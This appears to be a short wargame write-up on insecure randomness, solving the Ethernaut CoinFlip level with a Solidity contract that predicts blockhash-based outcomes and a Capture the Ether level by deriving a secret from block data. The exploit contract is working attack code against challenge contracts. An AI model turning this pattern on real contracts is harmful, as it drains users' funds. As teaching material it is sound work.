## Day 2 Insecure Randomness

### Ethernaut #3 (coinflip)

The objective here is to guess the coin flip outcome 10 times in a row.  The source of randomness on this coinflip is the block number.  We can write another contract to "predict" the source of randomness because both transactions will be in the same block.  Here is a smart contract that does that, and will complete the task.  

```Java
contract CoinFlipPredict {
    address constant COINFLIP_ADD = 0xfe706fe779C4ADDcf6BC54681C7af2Ea78e14D15;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip immutable _coin;
    uint256 lastHash;

    constructor(){
        _coin = CoinFlip(COINFLIP_ADD); 
    }

    function predict() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) { // check if we already predicted on this block
          revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        _coin.flip(side);
    }

}
```


### Capture the Ether Guess the random number

The objective here is once again to drain the contract.  It Requires 1ETH to deploy and each guess costs 1ETH.  The answer is generated as a Keccak256 hash of the blocknumber and the time when the contract was deployed.  We could solve this two ways: 1. look at the value stored in the contract, and 2. read the block number and creation timestamp.  

block.number: 1
block.timestamp: 1681421036

This can be used to derive 108 as the secret number, and capture the Eth.  